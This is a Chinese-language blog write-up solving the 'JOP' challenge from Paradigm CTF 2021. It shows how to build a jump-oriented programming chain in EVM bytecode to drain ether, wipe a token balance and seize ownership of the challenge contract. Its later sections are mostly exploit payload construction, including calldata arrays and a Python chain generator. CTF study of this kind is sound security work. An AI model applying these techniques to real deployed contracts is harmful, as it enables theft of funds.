---
layout: post
title:  "Paradigm 2021 JOP题解"
date:   2021-07-19 11:07:32 +0800
categories: paradigm
---
### 逻辑
1. panoramix反编译可以得到大部分逻辑，有一处动态跳转由```stor11 & 0xffffffff```决定目的地址，初始```stor11 == 0x01a300001074```
2. 修改panoramix代码强制赋值跳转地址0x1074（4212）之后可以得到正常情况下的完整流程，同时打印跳转后的stack: 

```python
[calldata[0:4], 0x774, 0xed0, 0x1d39, 'callvalue']
# 对应于
[value, 0x1d39, ?, ?, ?][::-1]
```
3. 手动修改合约的时候如果需要补全字节码（避免JUMP出问题）可以填JUMPDEST，0x5b
4. 先调用```27f83350(0xc4a)```设置跳转地址为setowner，然后调用```buyTokens()+player```尝试，发现交易失败，没关系，通过truffle debug调试无源码合约，```;```表示按指令步进，到末尾的栈发现跳转地址是```callvalue```导致跳转出错，同时缺少了load calldata导致sstore(6)的value是0，考虑更换stor11和callvalue

### 解题
1. Solidity语言是利用栈传递参数和返回值的，例如，对如下的合约而言

```solidity
contract Test {
    function fun1(uint a, uint b) returns(uint c, uint d) {
        // ....
    }
    function fun2(uint x) returns(uint y, uintz) {
        fun1(ccc, ddd);
    }
}
```
当fun2调用自身的函数fun1（不走call）时，调用前的堆栈如下（从底到顶）
```
[...., ret_addr(a JUMPDEST), ccc, ddd, fun1_addr(a JUMPDEST)]
```
这样，通过JUMP调用fun1，调用完成即将返回fun2的堆栈如下（从低到顶）
```
[...., c, d, ret_addr(a JUMPDEST)]
```
这样，通过JUMP可以返回fun2，同时堆栈上按顺序push了返回值
2. 我们的目标是在栈上部署一系列调用，使得栈看上去有如下构造
```
(栈底)
...
JSTOP(as ret_addr of FUNC2)
VAR1 of FUNC2
...
VARN of FUNC2
FUNC2(as ret_addr of FUNC1)
VAR1 of FUNC1
VAR2 of FUNC1
...
VARN of FUNC1
FUNC1
JJUMP x N(N >= 0, can be multiple times)
JJUMP(start of JOP-Chain)
(栈顶)
```
其中，JSTOP是```JUMPDEST; STOP```块，能立刻停止程序保证正常结束，JJUMP是```JUMPDEST; JUMP```块，能连续在栈部署的地址上进行跳跃保证缓冲。
栈顶部元素可以直接是FUNC1，只要能找到入口点是栈顶的JUMP即可
3. 为了部署栈上元素，首先需要找到返回值数量较多（且大于传入值）的函数LOADER，通过反复JUMP（LOADER的返回地址）到LOADER上可以依靠LOADER提供的逻辑在栈上部署一系列LOADER的返回值，最后LOADER返回到JOP-Chain开始的地方即可开始一系列函数调用


### 通用分析
1. ```panoramix --verbose```反编译可以打印堆栈，首先使用downloader下载运行时bytecode并反编译
2. 使用jopgadget检索需要的块，比如```jopgadget test目录 show 2 3 [true]```可以查看长度大于等于2小于等于3的块，true表示打印确定的跳转块(PUSH紧跟JUMP)
3. 使用jopgadget查看地址所在的块，比如```jopgadget test addr 0x123```
4. 使用debug_traceTransaction分析实际执行流，```w3.provider.make_request('debug_traceTransaction', [ TX_HASH, {}])```

### 本题构造
1. 由```panoramix --verbose```反编译结果可知（```jump to a parameter computed at runtime```），```buyTokens```函数最后跳转地址为stor11，且栈顶元素如下
```
[uint32(call.func_hash) >> 224, 1908, 3792, 7481, call.value, stor11]
```
相当于可以调用一个参数为0或参数为1（call.value可控但不能太大，比如到不了地址的大小）函数，其入口JUMPDEST为stor11，其返回地址为call.value（0参数）或7481（1参数），7481对应一个JJUMP块所以还能返回到“函数的返回值”上，问题不大
2. blabla
3. 转账
```
[stop, jj, 0x84, load,
int(player,16), balance(challange)+4, send_eth, jj]
```
4. 清空setup的token，考虑到```transferFrom(from, to, value)```函数，可以跳到检查caller完毕，执行```balanceOf[from] -= value```处，由反编译结果
```
...
  # [5393] sstore
  balanceOf[addr(_from)] -= _value
  #        [uint32(call.func_hash) >> 224, 746, addr(cd[4]), addr(cd[36]), cd[68], 0, 2382, addr(cd[4]), addr(cd[36]), cd[68], ('storage', 256, 0, ('var', '_6')) - cd[68]]
...
```
可得实际操作发生在pc=5393所在的块，复制此块代码用改版的panoramix模拟运行可得

```
入口14d0
[sta[0], sta[1], sta[2], sta[3], sta[4]]

逻辑
stor0[addr(sta[1])] = sta[4]

出口
略
```

可以看到此处不是```-=```而是```=```赋值，那么构造的栈应该是

```
[stop, setup, player, padding, 0, 0x14d0]
```

由于load参数只允许第一个值为0，所以要多load+pad，构造的calldata如下

```
[stop, jj, 0x84, load,
int(setup,16),jj,0x104,load,
int(player,16),jj,0x184,load,
pad,jj,0x204,load,
0,trans,jj,jj]
```
5. 更换owner，这里要跳两次而且跳完记得跳到转账（因为之前的操作又给合约打钱了），相当于跳三次，那么最好做一个通用的JOP生成

```python
def want_stack(stack):
     every4 = '(' + ('uint256,' * 4)[:-1] + ')'
     res = ""
     cnt = 0x84
     for x in stack:
         res += encode_single(every4, [x,jj,cnt,load]).hex()
         cnt += 0x80 # 一次load 4个0x20
     res += encode_single(every4, [jj,jj,jj,jj]).hex()
     return res
```
然后根据分析得到的set owner和accept owner入口点（见通用分析部分）生成payload并发送

```python
set_owner = 0x102a # pop 1, push 0
accept = 0xc4a # pop 0, push 0
payload = want_stack([stop,int(player,16),balance(challange)+4,send_eth,accept,dead_address,set_owner])
```